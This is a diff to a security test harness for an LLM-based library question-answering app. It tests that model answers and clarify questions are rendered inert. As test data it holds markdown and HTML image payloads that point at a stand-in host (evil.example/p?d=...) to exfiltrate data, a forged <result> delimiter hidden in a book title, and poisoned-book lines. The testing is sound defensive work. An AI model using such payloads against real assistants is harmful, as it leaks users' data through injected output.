@@ -57,7 +57,6 @@ Exit codes: 0 pass, 1 FAILED (or a misbehaving control), 2 CONTAINED,
 import argparse
 import asyncio
 import contextlib
-import html
 import importlib
 import importlib.util
 import json
@@ -72,7 +71,7 @@ from ask_your_library import nodes
 from ask_your_library import llm
 from ask_your_library.i18n import t
 from ask_your_library.nodes import clarify, observe, reflect, synthesize
-from ask_your_library.sanitize import sanitize_context
+from ask_your_library.sanitize import LINE_BREAK_RE, sanitize_context
 
 REPO = Path(__file__).resolve().parents[1]
 
@@ -506,8 +505,11 @@ HOSTILE_LINES = (f"WARNING: 1 of 1 quotes NOT found verbatim:\n  - Poisoned Book
 
 def assert_inert(html_text: str, where: str) -> None:
     """What every rendered fragment of ours must satisfy: it stays one HTML
-    block (no raw line break can end it) and carries no image construct."""
-    assert "\n" not in html_text, f"UI: {where} carries a raw line break (it ends the HTML block)"
+    block (no raw line break can end it) and carries no image construct. Every
+    break form counts: CommonMark ends a block on a bare CR and on U+2028/U+0085
+    as well, so the check is the same expression the renderer uses."""
+    assert not LINE_BREAK_RE.search(html_text), \
+        f"UI: {where} carries a raw line break (it ends the HTML block)"
     assert "![" not in html_text, f"UI: {where} carries an image construct"
     assert "evil.example/p?d=" not in html_text, f"UI: {where} carries an image URL"
 
@@ -525,7 +527,7 @@ def ui_stage(payloads: dict) -> tuple[str, None]:
         answer = (f"{MARKER} ![pixel](https://evil.example/p?d={MARKER}) "
                   f'![ref][x] <img src="https://evil.example/i.png"> '
                   "see [the book](https://example.org/x)\n\n[x]: https://evil.example/p")
-        rendered = ui.neutralize_markdown(html.escape(answer, quote=False))
+        rendered = ui.safe_markdown(answer)
         assert "![" not in rendered, "UI: an image construct survived neutralization"
         assert "[image removed]" in rendered, "UI: the inline image was not replaced"
         assert "evil.example/p?d=" not in rendered, "UI: the inline image URL survived"
@@ -535,7 +537,7 @@ def ui_stage(payloads: dict) -> tuple[str, None]:
         assert MARKER in rendered, "UI: the text itself must still be shown, only inert"
 
         question = payloads.get("prompt_boundary_stage") or f"Which book? {FORGED_RESULT}{MARKER}"
-        shown = ui.neutralize_markdown(html.escape(question, quote=False))
+        shown = ui.safe_markdown(question)
         assert "<result" not in shown and "&lt;result" in shown, \
             "UI: a forged delimiter in a book title reached the DOM unescaped"
         assert "![" not in shown, "UI: an image construct in the clarify question survived"
@@ -572,7 +574,7 @@ def ui_stage(payloads: dict) -> tuple[str, None]:
                                      "evidence_distilled": 0, "redacted_lines": 0}))
         assert footer, "UI: the metrics footer was not rendered"
         assert_inert(footer[0], "the metrics footer")
-    return ("UI render path (html.escape + neutralize_markdown on the answer and the clarify "
+    return ("UI render path (safe_markdown on the answer and the clarify "
             "question; the badge tooltip and the metrics footer on a hostile broken quote and "
             "stop reason): no image loads, HTML escaped, links survive -> BLOCKED "
             "(controls ok)"), None
